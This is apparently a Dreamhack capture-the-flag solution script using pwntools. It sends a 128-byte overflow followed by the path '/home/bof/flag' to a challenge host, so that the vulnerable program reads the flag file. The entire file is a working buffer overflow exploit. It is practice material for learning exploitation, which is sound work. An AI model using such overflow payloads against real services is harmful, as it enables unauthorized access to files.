from pwn import *

r = remote("host3.dreamhack.games", 11373)

payload = b'a'*128
payload += b'/home/bof/flag'

r.sendlineafter("meow? ", payload)

r.interactive()